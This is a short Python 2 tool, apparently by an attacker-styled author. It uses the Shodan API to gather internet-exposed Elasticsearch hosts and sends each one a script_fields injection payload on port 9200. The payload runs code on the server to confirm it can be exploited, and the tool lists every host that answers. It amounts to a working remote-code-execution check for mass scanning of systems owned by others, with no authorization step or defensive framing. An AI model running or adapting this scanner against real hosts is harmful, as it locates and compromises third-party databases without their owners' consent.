#!/usr/bin/env python  
# -*- coding: utf-8 -*- 
#by ha.cker@me.com
import time
import shodan
import sys
import urllib
import simplejson
import socket
print '******************************************************'
print '* Elasticsearch vul found Tool                       *'
print '* Write by ha.cker@me.com                            *'
print '* U can use shodan api to search the vul host        *'
print '******************************************************'
# Configuration
API_KEY = ""# api

def check(ip):
    ip=ip
    socket.setdefaulttimeout(3)
    try:
        rs = urllib.urlopen('http://'+'%s'% ip +':9200/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}},%22script_fields%22:{%22t%22:{%22script%22:%22Integer.toHexString(31415926)%22}}}}')
        rs = rs.read()
        rs = simplejson.loads(rs)
    except:
        pass
    try:
        for t in rs['hits']['hits'][0]['fields']['t']:
            t=t
    except:
        pass
    else:
        print 'found vul host : %s' % ip
def main():
    try:
            # Setup the api
            api = shodan.Shodan(API_KEY)
            query = 'you Know, for'
            for i in range(1,100):
                page = i
                try:
                    result = api.search(query,page)
                except Exception, e:
                    print 'Error: %s and sleep 10 s' % e
                    time.sleep(10)
                    pass
                else:
                    for service in result['matches']:
                        ip = service['ip_str']
                        ip=str(ip)
                        check(ip)
                # Loop through the matches and print each IP
                   
                        
    except Exception, e:
            print 'Error: %s and sleep 10 s' % e
            print i
            sys.exit(1)

if __name__ == '__main__':
    main()